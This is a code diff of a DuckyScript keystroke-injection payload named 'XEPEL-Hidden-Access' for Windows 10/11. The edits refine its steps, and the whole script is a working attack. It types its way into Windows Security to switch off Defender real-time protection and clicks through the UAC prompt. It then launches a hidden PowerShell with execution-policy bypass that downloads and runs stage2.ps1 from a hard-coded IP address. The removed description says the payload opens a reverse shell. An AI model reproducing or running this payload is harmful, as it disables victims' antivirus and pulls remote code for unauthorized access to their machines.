@@ -1,32 +1,46 @@
 REM Title: XEPEL-Hidden-Access
-REM Author: zb0r / XEPEL
-REM Description: Disables Defender, pulls stage2.ps1 from VPS, executes reverse shell
+REM Author: XEPEL
+REM Description: Disables Defender RT protection, pulls stage2.ps1 from VPS
 REM Target: Windows 10/11
-REM Note: Defender must be partially disabled or script runs faster
 
-REM ── Step 1: Open Windows Security to disable Defender ──
+REM ── Step 1: Open Windows Security ──
 GUI
-DELAY 300
+DELAY 500
 STRING windows security
+DELAY 500
+ENTER
+DELAY 2000
+
+REM ── Step 2: Click Virus and Threat Protection ──
+ENTER
+DELAY 1000
+
+REM ── Step 3: Navigate to Manage Settings ──
+TAB
+TAB
+TAB
+TAB
+TAB
 DELAY 300
 ENTER
 DELAY 1000
-ENTER
-TAB
-TAB
-TAB
+
+REM ── Step 4: Toggle Real Time Protection OFF ──
 TAB
 DELAY 300
 ENTER
 DELAY 600
-SPACE
-DELAY 600
+
+REM ── Step 5: UAC prompt – click Yes ──
 LEFT
 ENTER
-DELAY 300
-ALT F4
+DELAY 1500
 
-REM ── Step 2: Open hidden PowerShell and pull stage2.ps1 from VPS ──
+REM ── Step 6: Close Windows Security ──
+ALT F4
+DELAY 500
+
+REM ── Step 7: Pull and execute stage2.ps1 from VPS ──
 GUI r
 DELAY 600
 STRING powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')"
